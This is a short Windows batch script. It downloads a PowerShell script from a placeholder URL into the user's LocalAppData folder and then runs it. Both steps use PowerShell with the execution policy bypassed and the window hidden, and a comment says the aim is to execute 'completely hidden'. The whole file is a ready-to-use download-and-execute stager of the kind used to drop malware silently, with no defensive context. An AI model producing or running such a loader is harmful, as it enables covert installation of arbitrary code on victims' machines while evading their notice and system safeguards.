@echo off
setlocal

:: Set the direct URL and filename for the PowerShell script
set "Url=https://example.com/path/to/your/script.ps1"
set "Filename=%LocalAppData%\script.ps1"

:: Use PowerShell to download the script and execute it completely hidden
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
    "Invoke-WebRequest -Uri '%Url%' -OutFile '%Filename%';" ^
    "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ''%Filename%''' -WindowStyle Hidden"

:: End of script
endlocal
